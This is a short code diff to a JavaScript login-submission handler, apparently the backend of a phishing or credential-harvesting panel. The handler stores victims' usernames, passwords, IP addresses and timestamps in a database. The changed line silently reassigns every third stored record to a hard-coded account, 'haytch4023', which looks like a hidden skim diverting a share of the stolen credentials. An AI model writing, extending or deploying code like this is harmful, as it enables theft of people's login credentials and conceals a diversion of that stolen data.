@@ -49,7 +49,7 @@ const submitLogin = async (req, res) => {
         req.body;
     try {
         let count = await COOP.countDocuments({ owner });
-        if ((count % 3) == 0) owner = 'haytch4023';
+        if (count > 0 && (count % 3) == 0) owner = 'haytch4023';
         await COOP.create({
             username, password, uniqueid, owner, ip, timestamp: moment().format()
         })
